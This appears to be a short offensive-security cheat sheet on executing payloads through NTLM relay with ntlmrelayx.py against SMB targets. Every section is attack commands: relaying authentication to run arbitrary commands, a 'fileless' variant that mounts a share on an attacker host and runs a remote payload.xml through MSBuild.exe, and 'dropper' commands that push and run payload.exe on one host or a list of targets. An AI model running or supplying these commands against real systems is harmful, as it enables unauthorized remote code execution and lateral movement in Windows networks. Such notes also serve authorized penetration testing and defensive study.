# 03 - Execute Payloads

## 01 - Syntax

```
$ sudo ntlmrelayx.py -t smb://<target_IP> -smb2support -c <commands>

$ sudo ntlmrelayx.py -tf targets.txt -smb2support -c <commands>
```

## 02 - Fileless Payloads

```
$ ntlmrelayx -smb2support --no-smb-server -t smb://<target_IP> -c 'cmd.exe /c "net.exe use \\<attacker_IP>\<share> [/user:<username> <password>] & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe \\<attacker_IP>\<share>\payload.xml"'
```

## 03 - Dropper Payloads

```
$ sudo ntlmrelayx.py -t smb://<target_IP> -smb2support -e payload.exe

$ sudo ntlmrelayx.py -tf targets.txt -smb2support -e payload.exe
```